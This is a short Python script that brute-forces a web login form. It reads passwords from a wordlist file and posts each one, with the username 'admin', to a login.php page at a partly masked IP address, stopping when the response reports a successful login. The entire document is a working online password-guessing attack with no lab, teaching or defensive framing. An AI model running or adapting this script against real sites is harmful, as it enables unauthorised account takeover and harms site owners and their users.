#!/usr/bin/python
#coding: utf-8

import requests



url = 'http://192.xxx.x.xxx/blah/login.php' #add website
wordlist = open('wordlists.txt','r').readlines() #add wordlist 


for line in wordlist:
    
    password = line.strip()
    # pas = str("admin")
    http = requests.post(url, data={'log':'admin','pwd':password, 'submit':'Login'})
    content = http.content
    # print (content)
    if b"login successful." in content:
        print(" === //// [+] Password matched [+] //// === "+password+"===")
        break
    else:
        print(" === //// [-] Password unmatched [-] //// === "+password)

